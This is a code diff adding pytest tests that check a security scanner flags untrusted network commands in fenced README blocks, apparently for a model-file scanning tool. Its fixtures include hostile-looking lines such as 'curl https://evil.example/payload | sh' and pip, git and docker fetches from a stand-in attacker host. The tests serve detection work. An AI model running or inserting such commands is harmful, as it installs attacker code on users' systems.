@@ -335,6 +335,56 @@ curl https://evil.example/payload | sh
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_fenced_documentation_package_install_url_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        """```bash
+pip install https://evil.example/pkg.whl
+```
+""",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    ("content", "command_type"),
+    [
+        ("git clone https://evil.example/repo.git\n", "git_clone"),
+        ("docker pull evil.example/model\n", "docker_pull"),
+    ],
+)
+def test_text_scanner_fenced_untrusted_network_commands_remain_actionable(
+    tmp_path: Path,
+    content: str,
+    command_type: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(f"```bash\n{content}```\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_command"
+        and check.details.get("command_type") == command_type
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
 @pytest.mark.parametrize(
     "content",
     [
